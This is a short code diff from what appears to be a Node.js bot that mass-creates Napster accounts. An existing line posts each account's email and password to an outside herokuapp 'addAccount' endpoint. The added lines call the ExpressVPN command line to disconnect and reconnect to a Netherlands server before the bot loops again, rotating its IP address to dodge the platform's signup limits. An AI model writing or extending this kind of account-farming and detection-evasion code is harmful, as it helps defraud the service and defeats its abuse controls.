@@ -395,8 +395,12 @@ const main = async () => {
 
     await waitForDone()
     await page.cls()
-    main()
     request('https://online-music.herokuapp.com/addAccount?napster:' + email + ':' + pass, function (error, response, body) { })
+
+    shell.exec('expressvpn disconnect', { silent: true })
+    shell.exec('expressvpn connect nl')
+
+    main()
   }
 
   // await page.cls(true)
